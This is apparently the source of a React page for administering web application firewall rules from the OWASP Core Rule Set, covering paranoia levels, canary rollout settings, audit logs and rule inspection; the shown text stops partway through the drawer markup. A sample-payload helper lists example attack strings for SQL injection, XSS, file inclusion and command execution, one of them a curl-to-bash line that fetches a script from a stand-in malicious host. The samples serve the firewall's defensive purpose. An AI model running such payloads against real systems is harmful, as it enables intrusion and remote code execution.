import { useState, useEffect } from 'react';
import { createPortal } from 'react-dom';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Activity, ShieldAlert, ShieldAlert as AlertIcon, AlertTriangle as AlertTriangleIcon,
  Clock, Code, Database, ShieldCheck, Search, X, FlaskConical,
} from 'lucide-react';
import {
  getRules, enableRule, disableRule, setParanoiaLevel, getRulesStats, getRulesHistory,
  resetRules, getRuleDetails, setRuleCanary, getRuleCanaryReport, getRuleCanaryStatus,
  getCanaryRolloutSettings, saveCanaryRolloutSettings, runCanaryRolloutNow,
} from '../services/api';
import { formatLocalTime } from '../utils/helpers';
import { HelpText } from '../components/Tooltip';
import { useToast } from '../hooks/useToast';
import Toast from '../components/Toast';
import { useConfirm } from '../hooks/useConfirm';
import { useEscapeToClose } from '../hooks/useEscapeToClose';
import Pagination from '../components/Pagination';
import { FetchErrorState } from '../components/EmptyStates';

const CATEGORY_MAP = {
  "901": "Initialization",
  "905": "Common Exceptions",
  "911": "Method Enforcement",
  "913": "Scanner Detection",
  "920": "Protocol Enforcement",
  "921": "Protocol Attack",
  "922": "Multipart Attack",
  "930": "LFI",
  "931": "RFI",
  "932": "RCE",
  "933": "PHP Injection",
  "934": "Generic Attack",
  "941": "XSS",
  "942": "SQL Injection",
  "943": "Session Fixation",
  "944": "Java Injection",
  "949": "Blocking Evaluation",
  "950": "Data Leakage",
  "951": "SQL Leakage",
  "952": "Java Leakage",
  "953": "PHP Leakage",
  "954": "IIS Leakage",
  "955": "Web Shells",
  "956": "Ruby Leakage",
  "959": "Blocking Response",
  "980": "Correlation"
};

export default function Rules({ userRole }) {
  const [rules, setRules] = useState([]);
  const [stats, setStats] = useState({
    total_rules: 0,
    enabled_rules: 0,
    disabled_rules: 0,
    paranoia_level: 1,
    top_triggered_rules: [],
    category_distribution: [],
    tuning_candidates: []
  });
  const [history, setHistory] = useState([]);
  const [loading, setLoading] = useState(true);
  const [fetchError, setFetchError] = useState('');
  const [page, setPage] = useState(1);
  const [total, setTotal] = useState(0);
  const size = 10;

  // Filters state
  const [search, setSearch] = useState('');
  const [category, setCategory] = useState('');
  const [severity, setSeverity] = useState('');
  const [statusFilter, setStatusFilter] = useState('');

  // Modals / Drawer state
  const [selectedRule, setSelectedRule] = useState(null);
  const [ruleDetailLoading, setRuleDetailLoading] = useState(false);
  const [detailedRule, setDetailedRule] = useState(null);
  const [canaryReport, setCanaryReport] = useState(null);
  const [canaryReportLoading, setCanaryReportLoading] = useState(false);
  const [canaryToggling, setCanaryToggling] = useState(false);
  const [canaryStatus, setCanaryStatus] = useState(null);

  // Canary auto-rollout settings panel
  const [showRolloutSettings, setShowRolloutSettings] = useState(false);
  const [rolloutSettings, setRolloutSettings] = useState(null);
  const [rolloutSettingsLoading, setRolloutSettingsLoading] = useState(false);
  const [rolloutSettingsSaving, setRolloutSettingsSaving] = useState(false);
  const [rolloutRunning, setRolloutRunning] = useState(false);

  // Rule Disable Confirmation state
  const [ruleToDisable, setRuleToDisable] = useState(null);
  const [disableReason, setDisableReason] = useState('');
  const [disableError, setDisableError] = useState('');

  useEscapeToClose(() => {
    if (ruleToDisable) setRuleToDisable(null);
    else if (selectedRule) setSelectedRule(null);
  }, !!(ruleToDisable || selectedRule));

  // Notification states
  const { toast, showToast } = useToast();
  const confirm = useConfirm();

  const fetchRulesData = async () => {
    setLoading(true);
    try {
      const filters = {};
      if (search) filters.search = search;
      if (category) filters.category = category;
      if (severity) filters.severity = severity;
      if (statusFilter) filters.enabled = statusFilter === 'enabled';

      const [rulesRes, statsRes, historyRes] = await Promise.all([
        getRules(page, size, filters),
        getRulesStats(),
        getRulesHistory()
      ]);

      setRules(rulesRes.data);
      setTotal(rulesRes.total);
      setStats(statsRes);
      setHistory(historyRes);
      setFetchError('');
    } catch (error) {
      console.error("Failed to load WAF rules data:", error);
      // A toast that fades leaves the page showing stale/empty rule data
      // with no lasting signal that the load actually failed — keep a
      // persistent error state too so the rules list can't be mistaken for
      // "this WAF genuinely has zero rules."
      showToast("Failed to fetch WAF rules from backend.", "error");
      setFetchError(error.message || 'The dashboard could not reach the backend API.');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      fetchRulesData();
    }, 0);
    return () => clearTimeout(timer);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [page, category, severity, statusFilter]);

  // Handle Search submit
  const handleSearchSubmit = (e) => {
    e.preventDefault();
    setPage(1);
    fetchRulesData();
  };

  // Inspect rule detail
  const handleInspectRule = async (rule) => {
    setSelectedRule(rule);
    setRuleDetailLoading(true);
    setDetailedRule(null);
    setCanaryReport(null);
    setCanaryStatus(null);
    try {
      const detail = await getRuleDetails(rule.id);
      setDetailedRule(detail);
      if (detail.is_canary) {
        getRuleCanaryStatus(rule.id).then(setCanaryStatus).catch(() => {});
      }
    } catch (error) {
      console.error("Failed to inspect rule details:", error);
      showToast(`Could not load details for rule ${rule.id}`, "error");
    } finally {
      setRuleDetailLoading(false);
    }
  };

  const handleLoadRolloutSettings = async () => {
    setRolloutSettingsLoading(true);
    try {
      const settings = await getCanaryRolloutSettings();
      setRolloutSettings(settings);
    } catch (error) {
      showToast("Failed to load canary auto-rollout settings: " + (error.message || "Unknown error"), "error");
    } finally {
      setRolloutSettingsLoading(false);
    }
  };

  const handleSaveRolloutSettings = async () => {
    setRolloutSettingsSaving(true);
    try {
      const saved = await saveCanaryRolloutSettings(rolloutSettings);
      setRolloutSettings(saved);
      showToast("Canary auto-rollout settings saved.");
    } catch (error) {
      showToast("Failed to save settings: " + (error.message || "Unknown error"), "error");
    } finally {
      setRolloutSettingsSaving(false);
    }
  };

  const handleRunRolloutNow = async () => {
    setRolloutRunning(true);
    try {
      const result = await runCanaryRolloutNow();
      const parts = [];
      if (result.promoted.length) parts.push(`${result.promoted.length} promoted`);
      if (result.rolled_back.length) parts.push(`${result.rolled_back.length} rolled back`);
      if (result.needs_review.length) parts.push(`${result.needs_review.length} need review`);
      if (result.still_monitoring.length) parts.push(`${result.still_monitoring.length} still monitoring`);
      showToast(parts.length ? `Canary rollout: ${parts.join(', ')}.` : "No rules currently flagged for canary review.");
      if (selectedRule?.is_canary) {
        getRuleCanaryStatus(selectedRule.id).then(setCanaryStatus).catch(() => {});
      }
      fetchRulesData();
    } catch (error) {
      showToast("Failed to run canary rollout: " + (error.message || "Unknown error"), "error");
    } finally {
      setRolloutRunning(false);
    }
  };

  useEffect(() => {
    if (showRolloutSettings && !rolloutSettings) {
      handleLoadRolloutSettings();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [showRolloutSettings]);

  const handleToggleCanary = async (rule, canary) => {
    setCanaryToggling(true);
    try {
      await setRuleCanary(rule.id, canary);
      const updated = { ...(detailedRule || rule), is_canary: canary };
      setDetailedRule(updated);
      setSelectedRule((prev) => (prev ? { ...prev, is_canary: canary } : prev));
      showToast(canary ? `Rule ${rule.id} flagged for canary review.` : `Rule ${rule.id} removed from canary review.`);
      if (!canary) {
        setCanaryReport(null);
        setCanaryStatus(null);
      } else {
        getRuleCanaryStatus(rule.id).then(setCanaryStatus).catch(() => {});
      }
    } catch (error) {
      showToast("Failed to update canary status: " + (error.message || "Unknown error"), "error");
    } finally {
      setCanaryToggling(false);
    }
  };

  const handleLoadCanaryReport = async (rule) => {
    setCanaryReportLoading(true);
    try {
      const report = await getRuleCanaryReport(rule.id, 168);
      setCanaryReport(report);
    } catch (error) {
      showToast("Failed to load canary report: " + (error.message || "Unknown error"), "error");
    } finally {
      setCanaryReportLoading(false);
    }
  };

  // Toggle rule state (enable directly, show modal overlay for disabling)
  const handleToggleState = async (rule) => {
    if (!rule.enabled) {
      // Enabling rule: execute immediately
      setLoading(true);
      try {
        const res = await enableRule(rule.id);
        showToast(res.message || `Rule ${rule.id} has been enabled successfully.`);
        fetchRulesData();
      } catch (error) {
        showToast(error.message || `Failed to enable rule ${rule.id}`, "error");
        setLoading(false);
      }
    } else {
      // Disabling rule: show confirmation prompt and require a security justification reason
      setRuleToDisable(rule);
      setDisableReason('');
      setDisableError('');
    }
  };

  // Confirm rule disabling override
  const handleConfirmDisable = async () => {
    if (!disableReason || disableReason.trim().length < 3) {
      setDisableError("A valid justification reason is required to proceed.");
      return;
    }

    setLoading(true);
    const targetId = ruleToDisable.id;
    setRuleToDisable(null);

    try {
      const res = await disableRule(targetId, disableReason);
      showToast(res.message || `Rule ${targetId} has been overridden and disabled.`);
      fetchRulesData();
    } catch (error) {
      showToast(error.message || `Failed to disable rule ${targetId}`, "error");
      setLoading(false);
    }
  };

  // Paranoia Level Change
  const handleParanoiaLevelChange = async (level) => {
    if (level === stats.paranoia_level) return;
    setLoading(true);
    try {
      const res = await setParanoiaLevel(level);
      showToast(res.message || `Global detection paranoia level updated to PL${level}.`);
      fetchRulesData();
    } catch (error) {
      showToast(error.message || "Failed to update paranoia level", "error");
      setLoading(false);
    }
  };

  // Restore defaults
  const handleRestoreDefaults = async () => {
    if (!(await confirm({
      title: 'Restore WAF defaults',
      message: 'Are you sure you want to restore all OWASP CRS rules and paranoia levels to WAF system defaults?',
      confirmLabel: 'Restore',
      danger: true,
    }))) {
      return;
    }
    setLoading(true);
    try {
      const res = await resetRules();
      showToast(res.message || "WAF settings restored to system default configuration.");
      setPage(1);
      fetchRulesData();
    } catch (error) {
      showToast(error.message || "Failed to restore defaults.", "error");
      setLoading(false);
    }
  };

  // Trigger payload sample mapper based on Category
  const getPayloadSample = (cat) => {
    switch (cat) {
      case "SQL Injection": return ["' OR 1=1 --", "UNION SELECT null, username, password FROM users", "admin' --"];
      case "XSS": return ["<script>alert(1)</script>", "<img src=x onerror=alert(document.domain)>", "javascript:alert(1)"];
      case "LFI": return ["../../../../etc/passwd", "..\\..\\..\\windows\\system32\\cmd.exe", "/proc/self/environ"];
      case "RCE": return ["cat /etc/passwd", "curl http://malicious.site/shell.sh | bash", "; whoami; id"];
      case "Scanner Detection": return ["Nikto Vulnerability Scanner headers", "sqlmap parameter crawls", "nmap script triggers"];
      default: return ["Blocked anomalous traffic payload match.", "Specialized signature match."];
    }
  };

  return (
    <div className="rules-container">
      {/* Toast Alert overlay */}
      <Toast toast={toast} />

      {/* Top Header Card containing metrics summary and paranoia control */}
      <motion.div
        className="glass-panel"
        style={{ padding: '24px', marginBottom: '8px' }}
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
      >
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px', flexWrap: 'wrap', gap: '16px' }}>
          <div className="card-title" style={{ margin: 0 }}>
            <ShieldAlert size={20} color="var(--danger-color)" />
            WAF Rule Tuning & Administration
          </div>
          {userRole === 'admin' && (
            <button
              onClick={handleRestoreDefaults}
              className="action-btn-inspect"
              style={{ borderColor: 'rgba(168, 85, 247, 0.3)', color: 'var(--ml-color)', background: 'rgba(168, 85, 247, 0.05)' }}
            >
              Reset Overrides
            </button>
          )}
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: '16px', marginBottom: '24px' }}>
          <div className="metric-box" style={{ background: 'var(--surface-subtle)', border: '1px solid var(--border-subtle)', borderRadius: '8px', padding: '12px 16px' }}>
            <div style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>Total CRS Rules</div>
            <div style={{ fontSize: '24px', fontWeight: 600, color: 'var(--text-primary)', marginTop: '4px' }}>
              {stats.total_rules || rules.length}
            </div>
          </div>
          <div className="metric-box" style={{ background: 'rgba(16, 185, 129, 0.02)', border: '1px solid rgba(16, 185, 129, 0.1)', borderRadius: '8px', padding: '12px 16px' }}>
            <div style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>Active Guards</div>
            <div style={{ fontSize: '24px', fontWeight: 600, color: 'var(--success-color)', marginTop: '4px' }}>
              {stats.enabled_rules}
            </div>
          </div>
          <div className="metric-box" style={{ background: 'var(--danger-bg)', border: '1px solid var(--danger-bg)', borderRadius: '8px', padding: '12px 16px' }}>
            <div style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>Disabled Tuning Overrides</div>
            <div style={{ fontSize: '24px', fontWeight: 600, color: 'var(--danger-color)', marginTop: '4px' }}>
              {stats.disabled_rules}
            </div>
          </div>
          <div className="metric-box" style={{ background: 'var(--sev-low-bg)', border: '1px solid var(--sev-low-bg)', borderRadius: '8px', padding: '12px 16px' }}>
            <div style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>Paranoia Level</div>
            <div style={{ fontSize: '24px', fontWeight: 600, color: 'var(--sev-low)', marginTop: '4px' }}>
              PL {stats.paranoia_level}
            </div>
          </div>
        </div>

        {/* Paranoia Selector Slider */}
        <div style={{ background: 'var(--surface-subtle)', padding: '16px 20px', borderRadius: '12px', border: '1px solid var(--border-subtle)' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ fontSize: '14px', fontWeight: 600, color: 'var(--text-primary)' }}>OWASP CRS Paranoia Level Setting</div>
              <HelpText>
                Paranoia Level controls how strict the WAF rules are. Level 1 (default) blocks common attacks with minimal false positives. Higher levels add more aggressive rules but may block legitimate traffic. Start with PL1 and increase only if needed.
              </HelpText>
            </div>
            <div style={{ fontSize: '12px', color: 'var(--text-secondary)', marginTop: '2px' }}>Higher paranoia levels add strict rulesets to block advanced attacks but increase risk of false positives.</div>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <span style={{ fontSize: '11px', background: 'var(--sev-low-bg)', color: 'var(--sev-low)', border: '1px solid var(--sev-low-border)', padding: '3px 8px', borderRadius: '4px', fontWeight: 600 }}>
              ACTIVE: PL{stats.paranoia_level}
            </span>
          </div>

          <div className="paranoia-selector-wrapper">
            {[
              { level: 1, label: 'PL 1: Default', desc: 'Standard protection. Extremely low risk of false triggers. Recommended for core servers.' },
              { level: 2, label: 'PL 2: Strict', desc: 'Adds advanced syntax checking. Best balance of heavy security and business integrity.' },
              { level: 3, label: 'PL 3: Extreme', desc: 'Strict regex filters enabled. Potential false triggers on highly customized APIs.' },
              { level: 4, label: 'PL 4: Paranoid', desc: 'Defense-in-depth absolute guard. Highly restrictive. Ideal for ultra-secure lock-down APIs.' }
            ].map(item => (
              <button
                key={item.level}
                onClick={() => userRole === 'admin' && handleParanoiaLevelChange(item.level)}
                className={`paranoia-level-btn ${stats.paranoia_level === item.level ? 'active' : ''}`}
                style={userRole !== 'admin' ? { cursor: 'not-allowed', opacity: 0.6 } : {}}
                disabled={userRole !== 'admin'}
                title={userRole !== 'admin' ? "Only administrators can change paranoia level" : ""}
              >
                <div style={{ fontWeight: 600, fontSize: '13px', color: stats.paranoia_level === item.level ? 'var(--sev-low)' : 'var(--text-primary)' }}>{item.label}</div>
                <div style={{ fontSize: '10px', color: 'var(--text-secondary)', marginTop: '6px', lineHeight: '1.4' }}>{item.desc}</div>
              </button>
            ))}
          </div>
        </div>
      </motion.div>

      {/* Canary Auto-Rollout Settings */}
      <motion.div
        className="glass-panel"
        style={{ padding: '20px 24px', marginBottom: '8px' }}
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
      >
        <div
          style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', cursor: 'pointer' }}
          onClick={() => setShowRolloutSettings((v) => !v)}
        >
          <div className="card-title" style={{ margin: 0, fontSize: '14px' }}>
            <FlaskConical size={18} color="var(--sev-low)" />
            Canary Auto-Rollout
            <HelpText>
              Rules flagged for canary review enter a bounded monitoring window. When it re-runs
              (scheduled every 6h, or on demand below), a rule with a low sole-match rate (well
              corroborated by other rules) can be auto-promoted — just clears the flag, enforcement
              never changed. A rule with a high sole-match rate (often the sole reason a request got
              blocked, unconfirmed by anything else) can be auto-rolled-back — actually disabled,
              same path as clicking Disable yourself. Auto-promote defaults off; auto-rollback
              defaults on, since it can only ever disable a demonstrably risky rule.
            </HelpText>
          </div>
          <span style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>{showRolloutSettings ? 'Hide' : 'Show'}</span>
        </div>

        {showRolloutSettings && (
          <div style={{ marginTop: '16px' }}>
            {rolloutSettingsLoading || !rolloutSettings ? (
              <div className="spinner" style={{ margin: '12px auto' }}></div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
                <div style={{ display: 'flex', gap: '24px', flexWrap: 'wrap' }}>
                  <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '13px', color: 'var(--text-primary)' }}>
                    <input
                      type="checkbox"
                      checked={rolloutSettings.auto_promote_enabled}
                      disabled={userRole !== 'admin'}
                      onChange={(e) => setRolloutSettings({ ...rolloutSettings, auto_promote_enabled: e.target.checked })}
                    />
                    Auto-promote low-risk canary rules
                  </label>
                  <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '13px', color: 'var(--text-primary)' }}>
                    <input
                      type="checkbox"
                      checked={rolloutSettings.auto_rollback_enabled}
                      disabled={userRole !== 'admin'}
                      onChange={(e) => setRolloutSettings({ ...rolloutSettings, auto_rollback_enabled: e.target.checked })}
                    />
                    Auto-rollback high-risk canary rules
                  </label>
                </div>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: '14px' }}>
                  <div>
                    <div style={{ fontSize: '11px', color: 'var(--text-secondary)', marginBottom: '4px' }}>Monitoring window (hours)</div>
                    <input
                      type="number" min="1" max="720"
                      value={rolloutSettings.window_hours}
                      disabled={userRole !== 'admin'}
                      onChange={(e) => setRolloutSettings({ ...rolloutSettings, window_hours: parseInt(e.target.value) || 1 })}
                      className="settings-input"
                    />
                  </div>
                  <div>
                    <div style={{ fontSize: '11px', color: 'var(--text-secondary)', marginBottom: '4px' }}>Min. sample size (matches)</div>
                    <input
                      type="number" min="1" max="10000"
                      value={rolloutSettings.min_sample_size}
                      disabled={userRole !== 'admin'}
                      onChange={(e) => setRolloutSettings({ ...rolloutSettings, min_sample_size: parseInt(e.target.value) || 1 })}
                      className="settings-input"
                    />
                  </div>
                  <div>
                    <div style={{ fontSize: '11px', color: 'var(--text-secondary)', marginBottom: '4px' }}>Promote threshold (max sole-match %)</div>
                    <input
                      type="number" min="0" max="100"
                      value={Math.round(rolloutSettings.promote_max_sole_match_rate * 100)}
                      disabled={userRole !== 'admin'}
                      onChange={(e) => setRolloutSettings({ ...rolloutSettings, promote_max_sole_match_rate: (parseInt(e.target.value) || 0) / 100 })}
                      className="settings-input"
                    />
                  </div>
                  <div>
                    <div style={{ fontSize: '11px', color: 'var(--text-secondary)', marginBottom: '4px' }}>Rollback threshold (min sole-match %)</div>
                    <input
                      type="number" min="0" max="100"
                      value={Math.round(rolloutSettings.rollback_min_sole_match_rate * 100)}
                      disabled={userRole !== 'admin'}
                      onChange={(e) => setRolloutSettings({ ...rolloutSettings, rollback_min_sole_match_rate: (parseInt(e.target.value) || 0) / 100 })}
                      className="settings-input"
                    />
                  </div>
                </div>
                {userRole === 'admin' && (
                  <div style={{ display: 'flex', gap: '10px' }}>
                    <button onClick={handleSaveRolloutSettings} disabled={rolloutSettingsSaving} className="action-btn-inspect">
                      {rolloutSettingsSaving ? 'Saving...' : 'Save Settings'}
                    </button>
                    <button onClick={handleRunRolloutNow} disabled={rolloutRunning} className="action-btn-inspect">
                      {rolloutRunning ? 'Running...' : 'Run Rollout Now'}
                    </button>
                  </div>
                )}
              </div>
            )}
          </div>
        )}
      </motion.div>

      {/* Main Grid View split into Rules grid and Audits sidebar */}
      <div className="rules-grid-layout">

        {/* Left Side: Rule list database and search filters */}
        <motion.div
          className="glass-panel"
          style={{ padding: '24px' }}
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
        >
          <div className="card-title" style={{ marginBottom: '20px' }}>
            <Database size={18} color="var(--sev-low)" />
            OWASP Core Ruleset Registry
          </div>

          {/* Filters Bar */}
          <form onSubmit={handleSearchSubmit} style={{ display: 'flex', gap: '12px', marginBottom: '20px', flexWrap: 'wrap' }}>
            <div className="search-input-wrapper" style={{ flex: 1, minWidth: '200px' }}>
              <Search className="search-icon" size={16} style={{ left: '12px' }} />
              <input
                type="text"
                placeholder="Search rule ID, description..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="search-input"
                style={{ width: '100%', paddingLeft: '36px' }}
              />
            </div>

            <select
              value={category}
              onChange={(e) => { setCategory(e.target.value); setPage(1); }}
              className="filter-select"
            >
              <option value="">All Categories</option>
              {Object.values(CATEGORY_MAP).map(cat => (
                <option key={cat} value={cat}>{cat}</option>
              ))}
            </select>

            <select
              value={severity}
              onChange={(e) => { setSeverity(e.target.value); setPage(1); }}
              className="filter-select"
            >
              <option value="">All Severities</option>
              <option value="Critical">Critical</option>
              <option value="High">High</option>
              <option value="Medium">Medium</option>
              <option value="Low">Low</option>
            </select>

            <select
              value={statusFilter}
              onChange={(e) => { setStatusFilter(e.target.value); setPage(1); }}
              className="filter-select"
            >
              <option value="">All Statuses</option>
              <option value="enabled">Enabled</option>
              <option value="disabled">Disabled Override</option>
            </select>

            <button type="submit" className="modal-btn primary">
              Apply Filter
            </button>
          </form>

          {/* Rules List Container */}
          {loading ? (
            <div style={{ display: 'flex', justifyContent: 'center', padding: '60px 0' }}>
              <div className="spinner"></div>
            </div>
          ) : fetchError && rules.length === 0 ? (
            <FetchErrorState message={fetchError} onRetry={fetchRulesData} />
          ) : rules.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '60px 24px', color: 'var(--text-secondary)' }}>
              <ShieldCheck size={48} style={{ margin: '0 auto 12px', opacity: 0.3, color: 'var(--success-color)' }} />
              <h3>No Rules Found</h3>
              <p style={{ fontSize: '13px', marginTop: '6px' }}>Adjust your keyword search or active filter dropdown parameters.</p>
            </div>
          ) : (
            <div className="rules-container">
              {rules.map((rule) => (
                <div
                  key={rule.id}
                  className={`rule-card ${!rule.enabled ? 'disabled' : ''}`}
                >
                  <div className="rule-card-info">
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                      <span style={{ fontSize: '11px', fontFamily: 'monospace', background: 'var(--border-color)', border: '1px solid var(--surface-strong)', padding: '1px 6px', borderRadius: '4px', fontWeight: 600, color: 'var(--text-primary)' }}>
                        {rule.id}
                      </span>
                      <span style={{ fontWeight: 600, fontSize: '14px', color: rule.enabled ? 'var(--text-primary)' : 'var(--text-secondary)' }}>{rule.name}</span>

                      {rule.paranoia_level > stats.paranoia_level && (
                        <span style={{ fontSize: '9px', background: 'var(--sev-medium-bg)', color: 'var(--sev-medium)', border: '1px solid var(--sev-medium-border)', padding: '1px 5px', borderRadius: '3px', fontWeight: 500 }}>
                          PL {rule.paranoia_level} (Inactive)
                        </span>
                      )}
                    </div>

                    <p style={{ fontSize: '12px', color: 'var(--text-secondary)', margin: '2px 0 6px', lineHeight: '1.4' }}>
                      {rule.description}
                    </p>

                    <div className="rule-card-meta">
                      <span className="category-tag">{rule.category}</span>
                      <span className={`severity-pill ${rule.severity.toLowerCase()}`}>{rule.severity}</span>
                      {rule.hit_count > 0 && (
                        <span style={{ fontSize: '11px', color: 'var(--danger-color)', fontWeight: 500, display: 'flex', alignItems: 'center', gap: '4px' }}>
                          <AlertTriangleIcon size={12} />
                          {rule.hit_count} hits recorded
                        </span>
                      )}
                      {rule.last_triggered && (
                        <span style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>
                          Last: {rule.last_triggered}
                        </span>
                      )}
                    </div>
                  </div>

                  <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
                    <button
                      onClick={() => handleInspectRule(rule)}
                      className="action-btn-inspect"
                    >
                      Inspect
                    </button>

                    {/* Toggle Guard Switch */}
                    {userRole === 'admin' ? (
                      <div
                        className={`toggle-switch ${rule.enabled ? 'active' : ''}`}
                        onClick={() => handleToggleState(rule)}
                        style={{ flexShrink: 0 }}
                      >
                        <div className="toggle-knob"></div>
                      </div>
                    ) : (
                      <div
                        className={`toggle-switch ${rule.enabled ? 'active' : ''}`}
                        style={{ flexShrink: 0, opacity: 0.5, cursor: 'not-allowed' }}
                        title="Only administrators can enable or disable rules"
                      >
                        <div className="toggle-knob"></div>
                      </div>
                    )}
                  </div>
                </div>
              ))}
            </div>
          )}

          {!loading && (
            <Pagination
              page={page}
              totalPages={Math.max(1, Math.ceil(total / size))}
              total={total}
              itemLabel="rules"
              onPrev={() => setPage((p) => Math.max(1, p - 1))}
              onNext={() => setPage((p) => (p * size < total ? p + 1 : p))}
            />
          )}
        </motion.div>

        {/* Right Side: Tuning Recommendations and CyberSentinel Engine Change History Audits */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>

          {/* Active Tuning Candidates Card */}
          <motion.div
            className="glass-panel"
            style={{ padding: '20px' }}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
          >
            <div className="card-title" style={{ marginBottom: '16px' }}>
              <Activity size={18} color="var(--sev-medium)" />
              Tuning Candidates (High Trigger Rates)
            </div>

            {stats.tuning_candidates && stats.tuning_candidates.length > 0 ? (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                {stats.tuning_candidates.map(cand => (
                  <div key={cand.rule_id} style={{ padding: '12px 14px', background: 'var(--sev-medium-bg)', border: '1px solid var(--sev-medium-bg)', borderRadius: '8px' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                      <span style={{ fontSize: '11px', fontFamily: 'monospace', background: 'var(--sev-medium-bg)', color: 'var(--sev-medium)', padding: '1px 5px', borderRadius: '4px', fontWeight: 600 }}>
                        {cand.rule_id}
                      </span>
                      <span style={{ fontSize: '12px', color: 'var(--danger-color)', fontWeight: 600 }}>{cand.hit_count} dynamic blocks</span>
                    </div>
                    <div style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>{cand.name}</div>
                    <div style={{ fontSize: '10px', color: 'var(--text-secondary)', marginTop: '6px', lineHeight: '1.4' }}>
                      <strong>Recommendation:</strong> {cand.recommendation}
                    </div>
                  </div>
                ))}
              </div>
            ) : (
              <div style={{ textSelf: 'center', textAlign: 'center', padding: '24px 12px', color: 'var(--text-secondary)', fontSize: '12px' }}>
                <ShieldCheck size={32} style={{ margin: '0 auto 8px', color: 'var(--success-color)', opacity: 0.5 }} />
                No rule overrides recommended. Current trigger rates are stable.
              </div>
            )}
          </motion.div>

          {/* Change Auditing Logs Card */}
          <motion.div
            className="glass-panel"
            style={{ padding: '20px' }}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
          >
            <div className="card-title" style={{ marginBottom: '16px' }}>
              <Clock size={18} color="var(--ml-color)" />
              Administrative Audit Logs
            </div>

            <div className="audit-list">
              {history.length === 0 ? (
                <div style={{ textAlign: 'center', padding: '24px 12px', color: 'var(--text-secondary)', fontSize: '12px' }}>
                  No changes recorded in overrides database.
                </div>
              ) : (
                history.map((log, index) => (
                  <div className="audit-item" key={index}>
                    <div className="audit-meta-header">
                      <span style={{ fontWeight: 600 }}>@{log.username}</span>
                      <span>{formatLocalTime(log.timestamp)}</span>
                    </div>
                    <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                      <span className={`audit-action-badge ${log.action}`}>
                        {log.action}
                      </span>
                      {log.rule_id && (
                        <span style={{ fontFamily: 'monospace', fontSize: '11px', color: 'var(--text-secondary)' }}>
                          ID: {log.rule_id}
                        </span>
                      )}
                    </div>
                    <div style={{ color: 'var(--text-primary)', fontSize: '12px', lineHeight: '1.4', marginTop: '2px' }}>
                      {log.details}
                    </div>
                  </div>
                ))
              )}
            </div>
          </motion.div>
        </div>

      </div>

      {/* --- Rule inspection: non-blocking slide-out drawer (same .log-drawer
          pattern as MLLogDrawer.jsx / LogDetailsModal.jsx) instead of a
          centered modal — keeps the rule list visible behind it. --- */}
      {selectedRule && createPortal(
        <div className="log-drawer-overlay" onClick={() => setSelectedRule(null)}>
          <div className="log-drawer" style={{ width: 'min(680px, 92vw)' }} onClick={(e) => e.stopPropagation()}>
            <div className="log-drawer-header">
              <div className="log-drawer-title">
                <ShieldAlert size={18} color="var(--sev-low)" />
                Inspect Rule
                <span style={{ fontFamily: 'var(--font-mono)', fontSize: '11px', color: 'var(--text-muted)', fontWeight: 400 }}>
                  {selectedRule.id}
                </span>
              </div>
              <button className="log-drawer-close" onClick={() => setSelectedRule(null)} aria-label="Close rule details">
                <X size={16} />
              </button>
            </div>

            <div className="log-drawer-body">
              <div>
                <h3 style={{ margin: '0 0 8px', color: 'var(--text-primary)' }}>{selectedRule.name}</h3>
                <p style={{ fontSize: '13px', color: 'var(--text-secondary)', lineHeight: '1.5', margin: 0 }}>
                  {selectedRule.description}
                </p>
              </div>

              <div className="rule-drawer-grid">
                <div className="rule-meta-box">
                  <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>OWASP Category</div>
                  <div style={{ fontSize: '14px', fontWeight: 600, color: 'var(--text-primary)' }}>{selectedRule.category}</div>
                </div>
                <div className="rule-meta-box">
                  <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>Severity Level</div>
                  <div style={{ fontSize: '14px', fontWeight: 600, color: 'var(--text-primary)', display: 'flex', gap: '6px', alignItems: 'center' }}>
                    <span className={`severity-pill ${selectedRule.severity.toLowerCase()}`} style={{ display: 'inline-block' }}>{selectedRule.severity}</span>
                  </div>
                </div>
                <div className="rule-meta-box">
                  <div style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>CRS Paranoia Level</div>
                  <div style={{ fontSize: '14px', fontWeight: 600, color: 'var(--text-primary)' }}>PL {selectedRule.paranoia_level}</div>
                </div>
